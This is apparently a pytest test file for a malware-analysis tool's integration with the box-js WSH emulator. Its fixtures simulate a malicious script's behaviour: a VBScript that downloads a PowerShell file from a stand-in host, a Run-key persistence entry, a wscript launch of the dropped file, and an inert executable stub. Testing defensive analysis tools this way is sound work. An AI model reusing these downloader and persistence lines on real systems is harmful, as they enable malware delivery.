"""Improve languages, T17: box-js, the optional JScript / WSH emulator.

It obeys the emulation setting, runs on Windows Script Host scripts only, and what it sees goes to
the Resolution (*Seen in the sandbox*) and to Nested (``sandbox (box-js) → writes …``). Without
box-js provisioned nothing changes; the static evaluation leaves a busy loop to it.
"""

from __future__ import annotations

import base64
import hashlib
import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent))
from test_js_techniques import _analyze, _ms, client  # noqa: E402,F401

from docutracex import appsettings  # noqa: E402
from docutracex.parsers import boxjs  # noqa: E402

PE = b"MZ\x90\x00" + b"\x00" * 60 + b"This is an inert DocuTraceX sample, not a program.\r\n" * 3
VBS = 'Set h = CreateObject("MSXML2.XMLHTTP")\r\nh.Open "GET", "https://billing-portal.example/inv/sync.ps1", False\r\n'


@pytest.fixture()
def mode():  # noqa: ANN201
    old = appsettings.sandbox_mode()
    yield appsettings.set_sandbox_mode
    appsettings.set_sandbox_mode(old)


def _results(tmp: Path, pe: bytes = PE) -> Path:
    """A box-js results folder as box-js 1.9 leaves it."""
    res = tmp / "x.js.results"
    res.mkdir()
    (res / "a1.js").write_text("/* !!!! Patches from box-js !!!! */\nvar whole = 'sample';\n")
    (res / "a2.js").write_text("__bogus_var_name__ = 12;\nvar x = new ActiveXObject('WScript.Shell'); x.Run('calc');\n")
    (res / "r1").write_bytes(pe)
    ioc = [
        {"type": "Sample Name", "value": {"sample-name": "x.js"}, "description": ""},
        {"type": "FileWrite", "value": {"file": "C:\\(Temporary folder)\\\\factura_sync.vbs", "contents": VBS}},
        {"type": "NewResource", "value": {"path": "C:\\(Temporary folder)\\\\factura_viewer.exe",
                                          "sha256": hashlib.sha256(pe).hexdigest()}},
        {"type": "RegWrite", "value": {"key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\FacturaSync"}},
        {"type": "CommandExec", "value": {"command": "wscript.exe //B C:\\(Temporary folder)\\\\factura_sync.vbs"}},
        {"type": "XMLHTTP", "value": {"url": "https://billing-portal.example/inv/sync.ps1"}},
        {"type": "UrlFetch", "value": {"url": "https://billing-portal.example/inv/sync.ps1"}},
    ]
    (res / "IOC.json").write_text(json.dumps(ioc))
    (res / "urls.json").write_text(json.dumps(["https://billing-portal.example/inv/sync.ps1"]))
    return res


def test_parse_results_folder(tmp_path: Path) -> None:
    got = boxjs.parse(_results(tmp_path))
    kinds = [(e["kind"], e["detail"]) for e in got["events"]]
    assert ("writes", "C:\\(Temporary folder)\\factura_sync.vbs") in kinds
    assert ("command", "wscript.exe //B C:\\(Temporary folder)\\factura_sync.vbs") in kinds
    assert sum(k == "network" for k, _ in kinds) == 1                 # open + fetch + urls.json: one row
    assert any(k == "behaviour" and "FacturaSync" in d for k, d in kinds)
    st = {s["recipe"][-1]: s for s in got["stages"]}
    assert st["writes C:\\(Temporary folder)\\factura_sync.vbs"]["text"] == VBS
    assert st["writes C:\\(Temporary folder)\\factura_sync.vbs"]["ext"] == ".vbs"
    assert base64.b64decode(st["writes C:\\(Temporary folder)\\factura_viewer.exe"]["data_b64"]) == PE
    assert st["eval"]["text"].startswith("var x = new ActiveXObject")   # box-js's prefix gone, its own copy skipped
    assert all(s["recipe"][0] == "sandbox (box-js)" for s in got["stages"])


def test_only_wsh_scripts_and_absent_tool() -> None:
    assert boxjs.worth("var sh = new ActiveXObject('WScript.Shell');")
    assert not boxjs.worth("document.getElementById('x').onclick = function () {};")
    if not boxjs.available():
        assert boxjs.run("WScript.Echo(1)")["error"] == "box-js not provisioned"


def test_busy_loop_is_left_to_the_emulator() -> None:
    from docutracex.resolve import js_eval
    s = js_eval.resolve(_ms().wsh_emulated_js().decode(), "sample_wsh_emulated.js")
    assert any("busy loop" in u["why"] and u["depends_on"] == "k" for u in s.unresolved)
    # the stub does not depend on the key: it is resolved; the XOR'd text is not made up with a wrong key
    assert [st.data[:2] for st in s.stages] == [b"MZ"]


def test_merged_into_resolution_and_nested(client, mode, monkeypatch, tmp_path) -> None:  # noqa: ANN001,F811
    import re
    calls = []
    code = _ms().wsh_emulated_js()
    stub = base64.b64decode(re.search(rb"var hx = '([^']+)'", code).group(1))
    fake = boxjs.parse(_results(tmp_path, stub))      # box-js writes the same stub the script carries
    monkeypatch.setattr(boxjs, "available", lambda: True)
    monkeypatch.setattr(boxjs, "run", lambda code, name="": calls.append(name) or json.loads(json.dumps(fake)))
    mode("off")
    _cid, res = _analyze(client, "sample_wsh_emulated.js", _ms().wsh_emulated_js())
    js = json.loads((res / "javascript.json").read_text())["scripts"][0]
    assert not calls and "boxjs" not in js
    mode("always")
    _cid, res = _analyze(client, "sample_wsh_emulated.js", _ms().wsh_emulated_js())
    data = json.loads((res / "javascript.json").read_text())
    js = data["scripts"][0]
    assert calls and js["boxjs"]["stages"] >= 2
    seen = js["resolution"]["sandbox"]
    assert "box-js" in seen["tool"] and any(e.get("by") == "box-js" and e["kind"] == "command" for e in seen["events"])
    assert any(f["rule"] == "js_boxjs_command" for f in data["findings"])
    tree = json.loads((res / "nested.json").read_text())["tree"]
    recipes = [" → ".join(n.get("recipe") or []) for n in tree]
    assert any(r.startswith("sandbox (box-js) → writes") and r.endswith("factura_sync.vbs") for r in recipes), recipes
    # the MZ stub the static evaluation (and V8) resolved too: one child, not one per emulator
    assert sum(n.get("format") == "PE" for n in tree) == 1, recipes


@pytest.mark.skipif(not boxjs.available(), reason="box-js not provisioned")
def test_real_boxjs_on_the_sample() -> None:
    got = boxjs.run(_ms().wsh_emulated_js().decode(), "sample_wsh_emulated.js")
    texts = [s.get("text") or "" for s in got["stages"]]
    assert any("https://billing-portal.example/inv/sync.ps1" in t for t in texts), got
    assert any(e["kind"] == "command" for e in got["events"])
